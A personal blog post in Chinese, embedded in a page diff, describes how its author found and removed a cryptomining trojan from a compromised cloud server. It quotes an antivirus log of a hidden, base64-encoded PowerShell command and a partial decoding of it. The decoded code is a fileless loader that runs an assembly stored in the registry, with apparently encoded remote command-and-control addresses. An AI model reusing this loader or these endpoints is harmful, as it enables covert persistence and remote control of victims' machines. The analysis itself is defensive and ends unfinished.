@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="奕晨博苑 Giant Blog">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          记一次云服务器木马查杀 - Giant Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.giantliu.cn/2022/07/27/20220727SystemScriptKill/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/hux-blog.min.css">
+
+
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script>
+      var _hmt = _hmt || [];
+      (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?24856c1d0b87969df4b666e8aa18cff9";
+        var s = document.getElementsByTagName("script")[0]; 
+        s.parentNode.insertBefore(hm, s);
+      })();
+      </script>      
+<meta name="generator" content="Hexo 5.0.0"><link rel="alternate" href="/atom.xml" title="Giant Blog" type="application/atom+xml">
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Giant Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.giantliu.cn/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('https://open.saintic.com/api/bingPic/')
+        
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#随笔" title="随笔">随笔</a>
+                        
+                    </div>
+                    <h1>记一次云服务器木马查杀</h1>
+                    <h2 class="subheading">记录木马查杀过程</h2>
+                    <span class="meta">
+                        Posted by 刘巨 on
+                        2022-07-27
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-12
+                col-md-12
+                post-container">
+
+                <h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>前几天忽然收到华为云的短信通知<br>说我的云服务器存在对外攻击行为<br>一下就感觉是服务器被人黑了.<br><img src="2.png" alt="木马查杀"></p>
+<p>马上提交了工单,让华为云的技术人员帮我查一下服务器有哪些不正常的行为<br>华为云的技术人员给我反馈也下面这些问题</p>
+<ol>
+<li>异常网络链接<br><img src="3.png" alt="木马查杀"></li>
+<li>异常进程<br><img src="4.png" alt="木马查杀"></li>
+<li>异常文件<br><img src="5.png" alt="木马查杀"></li>
+<li>异常计划<br><img src="6.png" alt="木马查杀"></li>
+<li>异常代理作业<br><img src="7.png" alt="木马查杀"></li>
+<li>挖矿木马文件<br><img src="8.png" alt="木马查杀"></li>
+</ol>
+<p>ECS主机已确认被入侵了,然后华为云就把我的外网IP给禁用了.<br>到这里,这个ECS主机的对外服务已经全部中断<br>为了快速恢复,我只能通过华为云的控制台用VPC方式登录了云主机<br>把下面一些明面上的问题全都处理了一下.<br>然后把所有密码全都修改了</p>
+<p>初步定位原因是”疑似数据库弱口令”<br>然后黑客通过此通道把我服务器攻破了.</p>
+<p>把明面上的问题处理完成后,通过工单先让ECS外网恢复了.<br>个人习惯是不喜欢安装一些安全软件.<br>因为如果电脑安装了安全软件,会出现一些莫名其妙的问题<br>特别是在个人电脑上面。<br>所以在服务器上也没有太注意过安全问题。<br>只要把密码、端口、防火墙设置好一般来说还是没有问题的<br>但是千算万算，还是出现了密码泄露，导致服务器被攻破了。</p>
+<p>没办法，把明面上能看得出的问题解决后<br>在朋友的推荐下，不情愿的在服务器安装上了火绒安全软件<br>把软件设置好后，进行了第一次查杀<br><img src="9.png" alt="木马查杀"><br>一下查出三十多处问题，然后全部用安全软件处理了。<br>这下放心了不少。</p>
+<h2 id="深扒木马"><a href="#深扒木马" class="headerlink" title="深扒木马"></a>深扒木马</h2><p>处理现有木马文件后，火绒每几分钟就提示我有程序在隐藏执行PowerShell<br><img src="1.png" alt="木马查杀"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">【1】2022-07-27 14:54:15,系统防护,系统加固,scrcons.exe触犯敏感动作防护规则, 已阻止</span><br><span class="line"></span><br><span class="line">防护项目：隐藏执行PowerShell</span><br><span class="line">执行文件：C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line">执行命令行：&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot; -w hidden -NoProfile -EncodedCommand dAByAHkADQAKAHsADQAKACQAXwAwADAAMAAwACAAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBiAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAEgASwBMAE0AOgBcAFMAWQBTAFQARQBNACkALgBNAGEAaQBuACkADQAKACQAXwAwADAAMAAxACAAPQBbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACQAXwAwADAAMAAwACkADQAKACQAXwAwADAAMAAyACAAPQAgACQAXwAwADAAMAAxAC4ARQBuAHQAcgB5AFAAbwBpAG4AdAANAAoADQAKAFsAcwB0AHIAaQBuAGcAWwBdAF0AIAAkAF8AMAAwADAAMwAgAD0AIABAACgAIgBDAGkATgAzAGMAegBvAHYATAAzAGQAMwBkAHoAZwB1AFkAVwBSADIAWQBqAGwAbQBlAFgAaABzAFoAagBKADIATABtAE4AdgBiAFQAbwB4AE0AagBNADAATgBTADkAMwBjAHcAbwBqAGQAMwBNADYATAB5ADkAMwBkADMAYwAzAEwAbQBGAGsAZABtAEkANQBaAG4AbAA0AGIARwBZAHkAZABpADUAagBiADIAMAA2AE0AVABJAHoATgBEAFUAdgBkADMATQBLAEkAMwBkAHoATwBpADgAdgBkADMAZAAzAE4AaQA1AGgAWgBIAFoAaQBPAFcAWgA1AGUARwB4AG0ATQBuAFkAdQBZADIAOQB0AE8AagBFAHkATQB6AFEAMQBMADMAZAB6AEMAaQBOADMAYwB6AG8AdgBMADMAZAAzAGQAegBVAHUAWQBXAF</span><br><span class="line">操作结果：已阻止</span><br><span class="line"></span><br><span class="line">进程ID：9160</span><br><span class="line">操作进程：C:\Windows\System32\wbem\scrcons.exe</span><br><span class="line">操作进程命令行：C:\Windows\system32\wbem\scrcons.exe -Embedding</span><br><span class="line">操作进程校验和：2F88A2A21F4A40600EE3ED6B7D8D10B62CFEF7AB</span><br><span class="line">父进程ID：796</span><br><span class="line">父进程：C:\Windows\System32\svchost.exe</span><br><span class="line">父进程命令行：C:\Windows\system32\svchost.exe -k DcomLaunch -p</span><br></pre></td></tr></table></figure>
+
+<p>通过Base64反解码得到要执行的代码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_0000</span> =[<span class="type">Convert</span>]::Frombase64String((<span class="built_in">Get-ItemProperty</span> HKLM:\SYSTEM).Main)</span><br><span class="line"><span class="variable">$_0001</span> =[<span class="type">Reflection.Assembly</span>]::Load(<span class="variable">$_0000</span>)</span><br><span class="line"><span class="variable">$_0002</span> = <span class="variable">$_0001</span>.EntryPoint</span><br><span class="line"></span><br><span class="line">[<span class="built_in">string</span>[]] <span class="variable">$_0003</span> = <span class="selector-tag">@</span>(<span class="string">&quot;CiN3czovL3d3dzguYWR2YjlmeXhsZjJ2LmNvbToxMjM0NS93cwojd3M6Ly93d3c3LmFkdmI5Znl4bGYydi5jb206MTIzNDUvd3MKI3dzOi8vd3d3Ni5hZHZiOWZ5eGxmMnYuY29tOjEyMzQ1L3dzCiN3czovL3d3dzUuYW</span></span><br></pre></td></tr></table></figure>
+
+<p>可能记录的执行命令行日志有长度限制，所以只显示了部分日志<br>所以我们分析出一个不完整的脚本，但是我们可以从前2句代码分析出一些内容</p>
+<p>没有时间写了,有时间继续</p>
+
+                <hr>
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2022/07/26/20220726SmartEduVideoDownload/" data-toggle="tooltip" data-placement="top" title="国家中小学智慧教育平台视频课程下载">下一篇 &rarr;</a>
+                        </li>
+                    
+                </ul>
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-12
+                col-md-12
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#随笔" title="随笔">随笔</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="https://www.cnblogs.com/liuju150/" target="_blank">博客园</a></li>
+                    
+                        <li><a href="https://www.zhihu.com/people/giant150" target="_blank">知呼</a></li>
+                    
+                        <li><a href="https://weibo.com/liuju150" target="_blank">微博</a></li>
+                    
+                        <li><a href="https://github.com/liuju150" target="_blank">GitHub</a></li>
+                    
+                        <li><a href="https://gitee.com/GiantLiu" target="_blank">Gitee</a></li>
+                    
+                        <li><a href="https://giantliu.gitee.io" target="_blank">Gitee Blog</a></li>
+                    
+                        <li><a href="https://blog.giantliu.cn" target="_blank">Blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/giant150">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/liuju150">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/liuju150">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Giant Blog 2022 <br />
+                    <a target="_blank" href="https://beian.miit.gov.cn/">湘ICP备20015826号-2</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.giantliu.cn/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Side Catalog -->
+
+
+
+</body>
+
+</html>
